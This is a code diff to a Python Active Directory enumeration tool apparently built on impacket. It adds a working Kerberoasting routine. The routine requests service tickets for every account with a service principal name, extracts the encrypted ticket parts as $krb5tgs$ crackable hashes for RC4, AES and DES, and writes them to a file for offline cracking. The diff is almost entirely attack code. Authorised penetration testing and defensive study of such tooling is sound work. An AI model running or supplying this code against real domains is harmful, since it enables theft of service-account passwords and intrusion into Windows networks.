@@ -27,6 +27,7 @@ import datetime, random
 from impacket.krb5.ccache import CCache
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
 from impacket.ntlm import compute_lmhash, compute_nthash
+from impacket.krb5.asn1 import TGS_REP
 
 
 class EnumAD():
@@ -778,28 +779,80 @@ class EnumAD():
     def enumSPNUsers(self):
         users_spn = {
         }
+        user_tickets = {
+        }
+
+        kdcHost = self.domuser.split('@')[1]
+        #self.conn.search(self.dc_string[:-1], '(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer))(sAMAccountName:={0}))'.format(self.domuser.split('@')[0]), attributes=self.ldapProps, search_scope=SUBTREE)
+        #for entry in self.conn.entries:
+        #    ent = json.loads(entry.entry_to_json())
+        #    users_spn[self.domuser] = self.splitJsonArr(ent["attributes"].get("servicePrincipalName"))
 
         idx = 0
         for entry in self.spn:
             spn = json.loads(self.spn[idx].entry_to_json())
             users_spn[self.splitJsonArr(spn['attributes'].get('name'))] = self.splitJsonArr(spn['attributes'].get('servicePrincipalName')) 
             idx += 1    
-        print(users_spn.values())
 
         # Get TGT for the supplied user
         client = Principal(self.domuser, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         try:
             # We need to take the domain from the user@domain since it *could* be a cross-domain user
-            tgt, cipher, oldSession, newSession = getKerberosTGT(client, '', self.domuser.split('@')[1], compute_lmhash(self.passwd), compute_nthash(self.passwd), None, kdcHost=self.domuser.split('@')[1])
+            tgt, cipher, oldSession, newSession = getKerberosTGT(client, '', kdcHost, compute_lmhash(self.passwd), compute_nthash(self.passwd), None, kdcHost=kdcHost)
 
             TGT = {}
             TGT['KDC_REP'] = tgt
             TGT['cipher'] = cipher
             TGT['sessionKey'] = newSession
     
-            print(TGT)
+            for user, spns in users_spn.items():
+                if isinstance(spns, list):
+                    # We only really need one to get a ticket
+                    spn = spns[0]
+                else:
+                    spn = spns
+                    try:
+                        # Get the TGS
+                        serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+                        tgs, cipher, oldSession, newSession = getKerberosTGS(serverName, kdcHost, kdcHost, TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
+                        # Decode the TGS
+                        decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+
+                        # Get different encryption types
+                        if decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
+                            entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.rc4_hmac.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
+                            user_tickets[spn] = entry
+                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
+                            entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
+                            user_tickets[spn] = entry
+                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
+                            entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
+                            user_tickets[spn] = entry
+                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
+                            entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.des_cbc_md5.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
+                            user_tickets[spn] = entry
+                        else:
+                            # It might be a referral ticket
+                            print(decoded)
+
+                    except KerberosError:
+                        # For now continue
+                        # TODO: Maybe look deeper into issue here
+                        continue
+
+            if len(user_tickets.keys()) > 0:
+                with open('{0}-spn-tickets'.format(self.server), 'w') as f:
+                    json.dump(user_tickets, f, sort_keys=False)
+                if len(user_tickets.keys()) == 1:
+                    print('[ ' + colored('OK', 'yellow') +' ] Wrote {0} ticket for Kerberoasting'.format(len(user_tickets.keys())))
+                else:
+                    print('[ ' + colored('OK', 'yellow') +' ] Wrote {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))
+            else:
+                print('[ ' + colored('OK', 'green') +' ] Wrote {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))
+
 
         except KerberosError as err:
+            print(err)
             print('[ ' + colored('NOT OK', 'red') +' ] Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
             pass
 
